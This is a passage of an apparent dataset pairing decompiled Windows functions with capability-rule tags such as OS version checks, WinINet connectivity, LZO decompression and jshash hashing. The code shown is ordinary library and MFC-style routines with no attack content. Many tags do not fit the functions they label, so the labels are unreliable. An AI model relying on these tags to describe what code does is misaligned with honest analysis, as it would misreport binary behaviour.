        "decompiled_code": "\nuint __cdecl fcn.00446f78(uint arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h_00;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX;\n    int32_t *piVar5;\n    int32_t extraout_EDX;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *arg_10h;\n    piVar5 = in_ECX;\n    if (iVar3 < 0) {\n        fcn.00401100(0x80070057);\n        piVar5 = extraout_ECX;\n        iVar3 = extraout_EDX;\n    }\n    if (arg_ch == 0) {\n        fcn.004019a0(piVar5);\n    }\n    else {\n        iVar2 = *piVar5;\n        uVar1 = iVar2 + iVar3;\n        uVar6 = *(iVar2 + -0xc) + iVar2;\n        if (uVar1 < uVar6) {\n            iVar3 = fcn.00413130(uVar1, arg_ch);\n            if (uVar1 + iVar3 < uVar6) {\n                arg_10h_00 = fcn.004131ce(uVar1 + iVar3, arg_ch);\n                iVar2 = *arg_10h;\n                *arg_10h = iVar2 + iVar3 + 1 + arg_10h_00;\n                fcn.00446f13(arg_8h, iVar2 + iVar3, arg_10h_00);\n                return arg_8h;\n            }\n        }\n        *arg_10h = -1;\n        uVar4 = (**(**(*in_ECX + -0x10) + 0x10))();\n        fcn.004017d0(uVar4);\n    }\n    return arg_8h;\n}\n",
        "token_count": 454
    },
    "00447921": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00447921(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(param_1);\n    if (param_1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n        iVar2 = iVar2 + 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(param_1, uVar1, param_2);\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 148
    },
    "00447950": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447950(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uchar auStack784 [256];\n    uchar auStack528 [260];\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    iVar1 = fcn.00444bf8();\n    *(iVar1 + 8) = *(param_1 + 0x40);\n    *(iVar1 + 0xc) = *(param_1 + 0x40);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(param_1 + 0x40), auStack528, 0x104);\n    if ((iVar2 == 0) || (iVar2 == 0x104)) {\n        fcn.00433064();\n    }\n    puVar3 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)(auStack528);\n    if (puVar3 == NULL) {\n        fcn.00433064();\n    }\n    *puVar3 = 0;\n    iVar2 = fcn.00447921(auStack528, auStack268, 0x104);\n    if (iVar2 != 0) {\n        fcn.00433064();\n    }\n    if (*(param_1 + 0x5c) == 0) {\n        uVar4 = fcn.00412404(auStack268);\n        *(param_1 + 0x5c) = uVar4;\n    }\n    if (*(param_1 + 0x4c) == 0) {\n        iVar2 = fcn.00428f87(0xe000, auStack784, 0x100);\n        if (iVar2 == 0) {\n            puVar5 = *(param_1 + 0x5c);\n        }\n        else {\n            puVar5 = auStack784;\n        }\n        uVar4 = fcn.00412404(puVar5);\n        *(param_1 + 0x4c) = uVar4;\n    }\n    *(iVar1 + 0x10) = *(param_1 + 0x4c);\n    if (*(param_1 + 0x60) == 0) {\n        if (*(param_1 + 0x68) == 1) {\n            pcVar6 = \".CHM\";\n        }\n        else {\n            pcVar6 = \".HLP\";\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar3, pcVar6);\n        uVar4 = fcn.00412404(auStack528);\n        *(param_1 + 0x60) = uVar4;\n        *puVar3 = 0;\n    }\n    if (*(param_1 + 100) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack268, \".INI\");\n        uVar4 = fcn.00412404(auStack268);\n        *(param_1 + 100) = uVar4;\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 715
    },
    "00447a9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00447a9e(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.00444bf8();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    iVar3 = fcn.00444bf8();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x44) = param_1;\n        *(iVar3 + 0x48) = param_2;\n        *(iVar3 + 0x40) = unaff_ESI;\n        fcn.00447950();\n    }\n    iVar3 = fcn.00444bf8();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.0042f324();\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar3 != 0) {\n        *0x466bdc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 337
    },
    "004488c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004488c1(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoTreatAsClass;\n    iVar2 = (*_sym.imp.ole32.dll_CoTreatAsClass)(arg_ch, arg_10h);\n    if ((iVar2 != 0) && (arg_8h != 0)) {\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &var_8h);\n        var_4h = 0;\n        (*_sym.imp.ole32.dll_StringFromCLSID)(arg_ch, &var_4h);\n        uVar3 = fcn.00445f76(var_4h);\n        uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueA)(var_8h, uVar3, 1, arg_8h, uVar4);\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(uVar3);\n        iVar2 = (*pcVar1)(arg_ch, arg_10h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_8h);\n    }\n    return iVar2;\n}\n",
        "token_count": 339
    },
    "0044894c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0044894c(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    piVar1 = arg_8h;\n    if (arg_8h != NULL) {\n        iVar2 = (**(*arg_8h + 0x58))(arg_8h, &var_8h);\n        if ((iVar2 != 0) || (var_8h != 1)) {\n            (**(*piVar1 + 4))(piVar1);\n            return piVar1;\n        }\n        arg_8h = NULL;\n        iVar2 = (**(*piVar1 + 0x30))(piVar1, 1, &arg_8h);\n        if (iVar2 == 0) {\n            var_4h = NULL;\n            (**(*arg_8h + 0xc))(arg_8h, 1, &var_4h, 0);\n            fcn.004497d6(&arg_8h);\n            return var_4h;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 263
    },
    "00448eed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00448eed(int32_t arg_8h, int32_t noname_1, int32_t noname_2, int32_t noname_3, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h, int32_t arg_2ch, int16_t *arg_30h, int16_t *arg_34h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint hMem;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenW;\n    if (arg_30h == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_30h);\n        iVar2 = iVar2 + 1;\n    }\n    if ((arg_34h == NULL) || (*arg_34h == 0)) {\n        arg_34h = arg_30h;\n        iVar3 = iVar2;\n    }\n    else {\n        iVar3 = (*pcVar1)(arg_34h);\n        iVar3 = iVar3 + 1;\n    }\n    iVar3 = (iVar3 + iVar2) * 2 + 0x34;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2042, iVar3);\n    if (iVar4 != 0) {\n        piVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n        if (arg_30h == NULL) {\n            piVar5[0xb] = 0;\n        }\n        else {\n            piVar5[0xb] = 0x34;\n            fcn.0040a47c(piVar5 + 0xd, arg_30h);\n        }\n        if (arg_34h == NULL) {\n            piVar5[0xc] = 0;\n        }\n        else {\n            iVar2 = iVar2 * 2 + 0x34;\n            piVar5[0xc] = iVar2;\n            fcn.0040a47c(iVar2 + piVar5, arg_34h);\n        }\n        *piVar5 = iVar3;\n        piVar5[5] = arg_18h;\n        piVar5[1] = arg_8h;\n        piVar5[6] = arg_1ch;\n        piVar5[2] = noname_1;\n        piVar5[7] = arg_20h;\n        piVar5[8] = arg_24h;\n        piVar5[3] = noname_2;\n        piVar5[9] = arg_28h;\n        piVar5[4] = noname_3;\n        piVar5[10] = arg_2ch;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n    }\n    return iVar4;\n}\n",
        "token_count": 677
    },
    "004497f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004497f2(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1[1] == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(param_1 + 1);\n    if (iVar1 == 0) {\n        (**(*param_1 + 0x10))();\n    }\n    return iVar1;\n}\n",
        "token_count": 106
    },
    "00449830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00449830(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*param_1 + 0x44))(param_2);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*param_1 + 0x38))();\n        if ((((*0x459c1c == *param_2) && (param_2[1] == *0x459c20)) && (param_2[2] == *0x459c24)) &&\n           (param_2[3] == *0x459c28)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + param_1) != 0) {\n                        return piVar1[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *param_2) && (piVar1[1] == param_2[1])) &&\n                       ((piVar1[2] == param_2[2] && ((piVar1[3] == param_2[3] && (*(ppiVar3[1] + param_1) != 0)))))) {\n                        return ppiVar3[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 454
    },
    "004498de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004498de(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 292
    },
    "00449994": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449994(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(param_1 + 4);\n    return;\n}\n",
        "token_count": 85
    },
    "0044aaca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0044aaca(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.CDocManager.0;\n    pcVar1 = extraout_ECX[2];\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        *(unaff_EBP + -0x14) = pcVar1;\n        ppiVar3 = fcn.0040ab3a(unaff_EBP + -0x10);\n        piVar2 = *ppiVar3;\n        if (piVar2[7] != 0) {\n            fcn.00426fbe(*(unaff_EBP + -0x14));\n            (**(*piVar2 + 4))(1);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042705e();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 411
    },
    "00412e13": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412e13(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455e30, 0x14);\n    *(unaff_EBP + -0x20) = 0xffffffff;\n    fcn.00416625(0xd);\n    *(unaff_EBP + -4) = 0;\n    *0x4670cc = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == -2) {\n        *0x4670cc = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (iVar1 == -3) {\n        *0x4670cc = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (iVar1 == -4) {\n        *0x4670cc = 1;\n        iVar1 = *0x4673c0;\n    }\n    *(unaff_EBP + 8) = iVar1;\n    arg_8h_00 = *0x46870c;\n    if (iVar1 == *0x468824) {\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x24) = *0x46870c;\n        if ((arg_8h_00 == NULL) || (*arg_8h_00 != 0)) {\n            arg_8h_00 = fcn.0041101f(0x220);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n        }\n        if (arg_8h_00 != NULL) {\n            iVar1 = fcn.00412c73(*(unaff_EBP + 8));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *arg_8h_00 = 0;\n                arg_8h_00[1] = *0x468824;\n                arg_8h_00[2] = *0x468710;\n                arg_8h_00[3] = *0x468708;\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 5; iVar1 = iVar1 + 1) {\n                    *(arg_8h_00 + iVar1 * 2 + 0x10) = *(iVar1 * 2 + 0x468830);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 0x101; iVar1 = iVar1 + 1) {\n                    *(iVar1 + 0x1c + arg_8h_00) = *(iVar1 + 0x468720);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  *0x46870c = arg_8h_00,  iVar1 < 0x100; iVar1 = iVar1 + 1)\n                {\n                    *(iVar1 + 0x11d + arg_8h_00) = *(iVar1 + 0x468840);\n                }\n            }\n        }\n        if ((*(unaff_EBP + -0x20) == -1) && (arg_8h_00 != *0x46870c)) {\n            fcn.00411031(arg_8h_00);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00412f5a();\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 901
    },
    "00401450": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401450(uint *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t *unaff_EBP;\n    uint *puVar7;\n    \n    param_1 = *param_1;\n    ppiVar6 = param_1 + -4;\n    iVar2 = param_1[-3];\n    puVar3 = (**(**ppiVar6 + 0x10))();\n    iVar4 = (***puVar3)(param_2, 1);\n    if (iVar4 == 0) {\n        iVar4 = fcn.00401440();\n    }\n    if (iVar2 < param_2) {\n        param_2 = iVar2;\n    }\n    puVar7 = iVar4 + 0x10;\n    puVar3 = param_1;\n    for (uVar5 = param_2 + 1U >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar3;\n        puVar7 = puVar7 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    for (uVar5 = param_2 + 1U & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar7 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    *(iVar4 + 4) = iVar2;\n    piVar1 = param_1 + -1;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar6 + 4))(ppiVar6);\n    }\n    *unaff_EBP = iVar4 + 0x10;\n    return;\n}\n",
        "token_count": 475
    },
    "00401900": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nulong fcn.00401900(int32_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t **ppiVar7;\n    ulong uVar8;\n    \n    piVar2 = (**(**param_1 + 0x10))();\n    ppiVar6 = param_1 + 3;\n    if ((-1 < param_1[3]) && (piVar2 == *param_1)) {\n        LOCK();\n        piVar2 = *ppiVar6;\n        *ppiVar6 = *ppiVar6 + 1;\n        return CONCAT44(piVar2, param_1);\n    }\n    iVar3 = (***piVar2)(param_1[1], 1);\n    if (iVar3 == 0) {\n        fcn.00401100(0x8007000e);\n        pcVar1 = swi(3);\n        uVar8 = (*pcVar1)();\n        return uVar8;\n    }\n    *(iVar3 + 4) = param_1[1];\n    uVar4 = param_1[1] + 1;\n    ppiVar6 = param_1 + 4;\n    ppiVar7 = iVar3 + 0x10;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    for (uVar5 = uVar4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    return CONCAT44(uVar4, iVar3);\n}\n",
        "token_count": 465
    },
    "00401b10": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401b10(int32_t *param_1, uint *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *extraout_EDX;\n    uint32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uint *arg_8h;\n    uint *unaff_retaddr;\n    uint32_t in_stack_ffffffec;\n    \n    if (param_3 == 0) {\n        fcn.00401810();\n        return;\n    }\n    if (param_2 != NULL) goto code_r0x00401b38;\n    do {\n        fcn.00401100();\n        param_2 = extraout_EDX;\ncode_r0x00401b38:\n        iVar1 = *param_1;\n        uVar3 = param_2 - iVar1;\n        uVar2 = *(iVar1 + -0xc);\n        if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n            param_2 = unaff_retaddr;\n            in_stack_ffffffec = param_3;\n            fcn.004018b0(param_3, unaff_EDI, unaff_ESI);\n            unaff_retaddr = param_2;\n        }\n        unaff_ESI = unaff_EDI;\n        unaff_EDI = in_stack_ffffffec;\n        arg_8h = *param_1;\n        if (uVar2 < uVar3) {\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n        }\n        else {\n            fcn.004105b0(arg_8h, arg_8h + uVar3, param_3);\n        }\n        in_stack_ffffffec = unaff_EDI;\n    } while ((param_3 < 0) || (*(*param_1 + -8) < param_3));\n    *(*param_1 + -0xc) = param_3;\n    *(param_3 + *param_1) = 0;\n    return;\n}\n",
        "token_count": 600
    },
    "00402530": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00402530(int32_t **param_1, int32_t param_2, uint *param_3, uint32_t param_4, int32_t param_5)\n\n{\n    uchar *puVar1;\n    int32_t **ppiVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t **ppiVar5;\n    int32_t **ppiVar6;\n    uint *puVar7;\n    \n    puVar1 = param_3 + param_5;\n    if ((1U - (*param_1)[-1] | (*param_1)[-2] - puVar1) < 0) {\n        fcn.004018b0(puVar1);\n    }\n    ppiVar2 = *param_1;\n    ppiVar5 = param_1;\n    ppiVar6 = ppiVar2;\n    for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *ppiVar6 = *ppiVar5;\n        ppiVar5 = ppiVar5 + 1;\n        ppiVar6 = ppiVar6 + 1;\n    }\n    for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *ppiVar6 = *ppiVar5;\n        ppiVar5 = ppiVar5 + 1;\n        ppiVar6 = ppiVar6 + 1;\n    }\n    puVar7 = ppiVar2 + param_2;\n    for (uVar4 = param_4 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *param_3;\n        param_3 = param_3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (param_4 = param_4 & 3; param_4 != 0; param_4 = param_4 - 1) {\n        *puVar7 = *param_3;\n        param_3 = param_3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    if ((-1 < puVar1) && (puVar1 <= (*param_1)[-2])) {\n        (*param_1)[-3] = puVar1;\n        puVar1[*param_1] = 0;\n        return;\n    }\n    fcn.00401100(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 583
    },
    "00405e70": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00405e70(int32_t *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t unaff_EBX;\n    uint *puVar4;\n    uint *unaff_retaddr;\n    \n    iVar1 = *param_1;\n    uVar3 = *(iVar1 + -0xc);\n    param_3 = uVar3 + param_3;\n    if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n        fcn.004018b0(param_3);\n    }\n    if (param_2 - iVar1 <= uVar3) {\n        unaff_retaddr = *param_1 + (param_2 - iVar1);\n    }\n    puVar4 = *param_1 + unaff_EBX;\n    for (uVar3 = param_2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar4 = *unaff_retaddr;\n        unaff_retaddr = unaff_retaddr + 1;\n        puVar4 = puVar4 + 1;\n    }\n    for (param_2 = param_2 & 3; param_2 != 0; param_2 = param_2 - 1) {\n        *puVar4 = *unaff_retaddr;\n        unaff_retaddr = unaff_retaddr + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((-1 < param_3) && (param_3 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = param_3;\n        *(param_3 + *param_1) = 0;\n        return;\n    }\n    fcn.00401100(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 453
    },
    "004105b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004105b0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00410774;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x410898\n            switch(*((arg_10h & 3) * 4 + 0x410898)) {\n            case 0x4108b0:\ncode_r0x004108b0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x4108c0:\ncode_r0x004108c0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                